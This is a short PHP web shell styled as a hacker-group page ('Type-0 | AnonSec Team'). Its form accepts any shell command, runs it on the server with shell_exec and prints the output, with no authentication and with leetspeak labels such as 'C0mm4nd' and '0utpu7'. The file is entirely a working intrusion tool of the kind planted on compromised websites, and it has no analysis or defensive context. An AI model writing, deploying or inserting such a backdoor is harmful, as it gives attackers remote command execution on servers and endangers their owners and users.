<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Type-0 | AnonSecTeam</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 50px;
            background-color: #f9f9f9;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            background: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input[type="text"], textarea {
            margin-bottom: 10px;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        input[type="submit"] {
            padding: 10px;
            font-size: 16px;
            color: #fff;
            background-color: #007BFF;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #0056b3;
        }
        .output {
            white-space: pre-wrap;
            background: #f1f1f1;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>[Type-0 | AnonSec Team]</h2>
        <form method="POST">
            <label for="command">C0mm4nd:</label>
            <input type="text" id="command" name="command" required>
            <input type="submit" value="Execute">
        </form>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $command = escapeshellcmd($_POST['command']);
            echo "<h3>0utpu7:</h3>";
            echo "<div class='output'><pre>";
            $output = shell_exec($command);
            echo htmlspecialchars($output);
            echo "</pre></div>";
        }
        ?>
    </div>
</body>
</html>
